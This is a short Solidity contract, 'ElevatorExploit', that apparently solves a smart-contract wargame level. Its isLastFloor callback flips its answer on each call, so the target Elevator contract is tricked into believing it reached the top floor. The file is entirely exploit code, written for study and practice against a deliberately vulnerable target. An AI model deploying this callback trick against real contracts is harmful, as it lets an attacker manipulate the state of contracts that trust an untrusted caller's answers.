pragma solidity 0.8.4;

interface ElevatorInterface{
    function goTo(uint _floor) external;
    function floor() external returns(uint);
    function top() external returns(bool);
}

contract ElevatorExploit{
    // Variables & Declarations
	address elevatorAddr;
    bool topFloor;

	// Constructor
	constructor(address addr) public{
		elevatorAddr = addr;
	}

    // Method
    function isLastFloor(uint) public returns (bool){
        if(topFloor){
            topFloor = false;
            return false;
        }
        else{
            topFloor = true;
            return true;
        }
    }

    function attack() public{
        ElevatorInterface ei = ElevatorInterface(elevatorAddr);
        topFloor = true;
        ei.goTo(33);

    }
}